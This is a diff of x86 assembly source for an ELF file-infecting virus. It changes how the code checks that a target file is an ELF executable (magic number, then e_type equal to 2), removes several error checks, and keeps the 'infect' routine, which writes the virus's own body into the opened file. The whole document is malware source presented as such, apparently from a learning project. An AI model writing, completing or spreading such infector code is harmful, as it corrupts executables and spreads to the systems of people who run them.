@@ -51,6 +51,7 @@
 %define ELFHDR_size 52
 %define ELFHDR_phoff	28
 
+
 %define FD dword [ebp - 4]
 %define ELFHDR ebp - 56 ; Subbing 56 because -4 for pc increment and 52 for elf header size 
 
@@ -68,15 +69,15 @@ _start:
 	mov FD, eax
 
 	; Checking if file is an elf file
-	lea esi, [ELFHDR]		; Grabbing the effective address of elf header
-	read FD, esi, ELFHDR_size
-	cmp eax, 0
-	jl error
-	cmp dword [esi], 0x464C457F
+	lea ecx, [ELFHDR]		; Grabbing the effective address of elf header
+	read FD, ecx, ELFHDR_size
+	cmp dword [ecx], 0x464C457F
 	jne not_elf
 
-	; file is an ELF file, so we'll infect it
-	jmp infect
+	; unseen
+	lea esi, [ELFHDR + 16]
+	cmp word [esi], 0002
+	jne VirusExit
 
 infect:
 	; first print Outstr to STDOUT
@@ -89,14 +90,10 @@ infect:
 	mov edx, virus_end - _start
 	write FD, ecx, edx
 	close FD
-	cmp eax, 0
-	jl error
 	jmp VirusExit
 
 not_elf:
 	close FD
-	cmp eax, 0
-	jl error
 	write 1, Failstr, 12
 	exit -1
 
